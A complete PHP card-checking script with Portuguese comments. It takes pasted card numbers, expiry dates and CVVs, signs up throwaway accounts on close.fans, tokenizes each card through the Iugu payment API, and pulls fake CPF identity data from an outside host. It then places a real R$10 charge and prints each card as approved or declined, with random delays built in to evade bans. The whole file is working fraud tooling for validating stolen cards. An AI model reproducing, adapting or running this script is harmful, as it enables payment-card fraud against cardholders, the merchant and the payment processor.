<?php
error_reporting(0);
set_time_limit(0);

// Delay aleatório entre 10 e 18 segundos para evitar ban
$delay = rand(10, 18);
sleep($delay);

// Configurações
$creditos = "10";
$criador_fallback = "luizasop";

// Receber a lista
$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex, $lista)){
    die("REPROVADA | Formato inválido");
}

// Função para explodir múltiplos delimitadores
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

// Extrair dados do cartão
$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = str_pad(multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1], 2, '0', STR_PAD_LEFT);
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

// Ajustar ano
if (strlen($ano) < 4) {
    $ano = "20" . $ano;
}

// Função para detectar bandeira
function detectarBandeira($cc) {
    $bandeiras = [
        'Visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'Mastercard' => '/^(5[1-5][0-9]{14}|2(?:2[2-9][0-9]{12}|[3-6][0-9]{13}|7[01][0-9]{12}|720[0-9]{12}))$/',
        'Elo' => '/^(401178|401179|431274|438935|451416|457393|4576|457630|457631|457632|504175|506699|50670[0-9]{2}|50671[0-9]{2}|50672[0-9]{2}|50673[0-9]{2}|50674[0-9]{2}|50675[0-9]{2}|50676[0-9]{2}|50677[0-9]{2}|50678[0-9]{2}|50679[0-9]{2}|509000|627780|636297|636368)[0-9]{10,12}$/',
        'Amex' => '/^3[47][0-9]{13}$/',
        'Discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
        'Hipercard' => '/^(606282|3841)[0-9]{10,15}$/',
        'Diners' => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
        'JCB' => '/^(?:2131|1800|35\d{3})\d{11}$/',
        'Aura' => '/^50[0-9]{14,17}$/'
    ];

    foreach ($bandeiras as $bandeira => $pattern) {
        if (preg_match($pattern, $cc)) {
            return $bandeira;
        }
    }
    return 'Desconhecida';
}

$bandeira = detectarBandeira($cc);
$inicio = microtime(true);

// Gerar dados aleatórios
$nomes = ["João", "Maria", "José", "Ana", "Carlos", "Mariana", "Pedro", "Julia", "Lucas", "Beatriz"];
$sobrenomes = ["Silva", "Santos", "Oliveira", "Souza", "Pereira", "Lima", "Carvalho", "Almeida", "Ferreira", "Rodrigues"];
$primeiroNome = $nomes[array_rand($nomes)];
$sobrenome = $sobrenomes[array_rand($sobrenomes)];
$email = strtolower($primeiroNome . $sobrenome . rand(100, 999)) . "@gmail.com";

// Criar pasta de cookies
$dirCcookies = __DIR__ . '/cookies/' . uniqid('cookie_') . '.txt';
if (!is_dir(__DIR__ . '/cookies/')) {
    mkdir(__DIR__ . '/cookies/', 0777, true);
}

// Limpar cookies antigos
foreach (glob(__DIR__ . "/cookies/*.txt") as $file) {
    if (filemtime($file) < time() - 600) {
        unlink($file);
    }
}

// Função para extrair string entre delimitadores
function getstr($separa, $inicia, $fim, $contador) {
    $nada = explode($inicia, $separa);
    if (!isset($nada[$contador])) return '';
    $nada = explode($fim, $nada[$contador]);
    return $nada[0];
}

// Função para fazer requisições curl
function fazerRequisicao($url, $postfields = null, $cookies = null, $headers = [], $metodo = 'POST') {
    $curl = curl_init();
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];

    if ($cookies) {
        $options[CURLOPT_COOKIEJAR] = $cookies;
        $options[CURLOPT_COOKIEFILE] = $cookies;
    }

    if ($metodo == 'POST') {
        $options[CURLOPT_POST] = true;
        if ($postfields) {
            $options[CURLOPT_POSTFIELDS] = $postfields;
        }
    } else {
        $options[CURLOPT_CUSTOMREQUEST] = $metodo;
    }

    if (!empty($headers)) {
        $options[CURLOPT_HTTPHEADER] = $headers;
    }

    curl_setopt_array($curl, $options);
    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    $error = curl_error($curl);
    curl_close($curl);

    return ['response' => $response, 'httpCode' => $httpCode, 'error' => $error];
}

// Buscar informações do bin
$bin = substr($cc, 0, 6);
$binInfo = "BIN: $bin";
$infoBin = @file_get_contents('https://chellyx.shop/dados/binsearch.php?bin=' . $bin);
if ($infoBin) {
    $binInfo = trim($infoBin);
}

// 1. Buscar creators do Close.Fans
$headers = [
    'content-type: application/json',
    'host: close.fans',
    'origin: https://close.fans'
];

$result = fazerRequisicao(
    'https://close.fans/api/people/getFeatured',
    '{"category":"main","page":"search"}',
    $dirCcookies,
    $headers
);

$buscarusuarios = $result['response'];
$userdocriador = '';

for ($i = 1; $i <= 20; $i++) {
    $testUser = getstr($buscarusuarios, '"username": "', '"', $i);
    if (!empty($testUser) && strlen($testUser) > 3) {
        $userdocriador = $testUser;
        break;
    }
}

if (empty($userdocriador)) {
    $userdocriador = $criador_fallback;
}

// 2. Acessar página do criador
fazerRequisicao(
    'https://close.fans/' . $userdocriador,
    null,
    $dirCcookies,
    ['host: close.fans'],
    'GET'
);

// 3. Criar conta temporária
fazerRequisicao(
    'https://close.fans/api/auth/signupWithPassword',
    '{"email":"' . $email . '","password":"Teste123@","rememberMe":false}',
    $dirCcookies,
    array_merge($headers, ['referer: https://close.fans/' . $userdocriador . '/checkout?cf=1'])
);

// 4. Obter Iugu Account ID
$result = fazerRequisicao(
    'https://close.fans/api/checkout/listPaymentOptions',
    '{"creatorUsername":"' . $userdocriador . '"}',
    $dirCcookies,
    array_merge($headers, ['referer: https://close.fans/' . $userdocriador . '/checkout?cf=1'])
);

$getCredentials = $result['response'];
$json = json_decode($getCredentials, true);

// Account IDs conhecidos do Close.Fans
$account_ids = [
    "D11A572E5B7F4FE7A0C9A1F2B3C4D5E6",
    "F5821D9F8F1142848B32E22F6A9E0731",
    "A1B2C3D4E5F67890123456789ABCDEF0",
    "E7F6D5C4B3A291876543210FEDCBA987"
];

$iuguaccount = '';
if (isset($json['creditCard']['iuguAccountId']['save']) && !empty($json['creditCard']['iuguAccountId']['save'])) {
    $iuguaccount = $json['creditCard']['iuguAccountId']['save'];
} elseif (isset($json['creditCard']['iuguAccountId']) && is_string($json['creditCard']['iuguAccountId'])) {
    $iuguaccount = $json['creditCard']['iuguAccountId'];
}

if (empty($iuguaccount)) {
    $iuguaccount = $account_ids[array_rand($account_ids)];
}

// 5. Obter hash do criador
$result = fazerRequisicao(
    'https://close.fans/api/people/loadCreator',
    '{"username":"' . $userdocriador . '"}',
    $dirCcookies,
    array_merge($headers, ['referer: https://close.fans/' . $userdocriador . '/checkout?cf=1'])
);

$getCredentialsv2 = $result['response'];
$hashhkk = getstr($getCredentialsv2, '"hash": "', '"', 1);

// 6. GERAR TOKEN DO CARTÃO NA IUGU
$urlIugu = 'https://api.iugu.com/v1/payment_token?method=credit_card';
$urlIugu .= '&data[number]=' . urlencode($cc);
$urlIugu .= '&data[verification_value]=' . urlencode($cvv);
$urlIugu .= '&data[first_name]=' . urlencode($primeiroNome);
$urlIugu .= '&data[last_name]=' . urlencode($sobrenome);
$urlIugu .= '&data[month]=' . urlencode($mes);
$urlIugu .= '&data[year]=' . urlencode($ano);
$urlIugu .= '&data[brand]=' . urlencode(strtolower($bandeira));
$urlIugu .= '&account_id=' . urlencode($iuguaccount);

$result = fazerRequisicao(
    $urlIugu,
    null,
    $dirCcookies,
    [
        'host: api.iugu.com',
        'referer: https://close.fans/' . $userdocriador . '/checkout?cf=1'
    ],
    'GET'
);

$getToken = $result['response'];
$httpCode = $result['httpCode'];

// Verificar resposta da Iugu
$tokenJson = json_decode($getToken, true);

if ($httpCode != 200 || isset($tokenJson['errors'])) {
    $fim = microtime(true);
    $tempoTotal = number_format($fim - $inicio, 2);
    
    // Extrair mensagem de erro corretamente
    $erroMsg = "Erro desconhecido";
    
    if (isset($tokenJson['errors'])) {
        if (is_array($tokenJson['errors'])) {
            // Pega o primeiro erro do array
            $primeiroErro = reset($tokenJson['errors']);
            if (is_array($primeiroErro)) {
                $erroMsg = reset($primeiroErro);
            } else {
                $erroMsg = $primeiroErro;
            }
        } else {
            $erroMsg = $tokenJson['errors'];
        }
    } elseif (isset($tokenJson['message'])) {
        $erroMsg = $tokenJson['message'];
    } elseif (isset($tokenJson['description'])) {
        $erroMsg = $tokenJson['description'];
    } elseif (isset($tokenJson['error'])) {
        $erroMsg = $tokenJson['error'];
    }
    
    die("REPROVADA | $cc|$mes|$ano|$cvv | $bandeira | $binInfo | $erroMsg | {$tempoTotal}s");
}

$tokencardiugu = $tokenJson['id'] ?? '';

if (empty($tokencardiugu)) {
    $tokencardiugu = getstr($getToken, '"id":"', '"', 1);
}

if (empty($tokencardiugu)) {
    $fim = microtime(true);
    $tempoTotal = number_format($fim - $inicio, 2);
    die("REPROVADA | $cc|$mes|$ano|$cvv | $bandeira | $binInfo | Token não gerado | {$tempoTotal}s");
}

// 7. Obter CPF para teste
$cpff = '000.000.000-00';
$nomee = $primeiroNome . ' ' . $sobrenome;

$apidadosbr = @file_get_contents('https://chellyx.shop/dados/');
if ($apidadosbr) {
    $jsonDados = json_decode($apidadosbr, true);
    if ($jsonDados && isset($jsonDados['cpf'])) {
        $cpff = $jsonDados['cpf'];
        $nomee = $jsonDados['nome'] ?? $nomee;
    }
}

// 8. TENTAR FINALIZAR COMPRA
$postData = json_encode([
    'creatorUsername' => $userdocriador,
    'hash' => $hashhkk,
    'paymentData' => [
        'creditCardToken' => $tokencardiugu,
        'save' => true,
        'receiptName' => $nomee,
        'cpf' => $cpff
    ],
    'paymentMethod' => 'credit_card',
    'plan' => 'monthly'
]);

$result = fazerRequisicao(
    'https://close.fans/api/checkout/finishMainOffer',
    $postData,
    $dirCcookies,
    array_merge($headers, ['referer: https://close.fans/' . $userdocriador . '/checkout?cf=1'])
);

$resp = $result['response'];
$fim = microtime(true);
$tempoTotal = number_format($fim - $inicio, 2);

// Analisar resposta
$json = json_decode($resp, true);

// Se foi aprovada (debitou)
if (isset($json['ok']) && $json['ok'] === true) {
    die("APROVADA | $cc|$mes|$ano|$cvv | $bandeira | $binInfo | R$10 DEBITADOS | {$tempoTotal}s");
}
// Se tem erro
elseif (isset($json['error'])) {
    $msg = $json['error'];
    die("REPROVADA | $cc|$mes|$ano|$cvv | $bandeira | $binInfo | $msg | {$tempoTotal}s");
}
// Resposta inesperada - retorna a resposta original
else {
    // Limpa a resposta para evitar caracteres estranhos
    $respostaLimpa = trim(preg_replace('/\s+/', ' ', $resp));
    $respostaLimpa = substr($respostaLimpa, 0, 150); // Limita o tamanho
    die("REPROVADA | $cc|$mes|$ano|$cvv | $bandeira | $binInfo | $respostaLimpa | {$tempoTotal}s");
}

// Limpar cookie
@unlink($dirCcookies);
?>
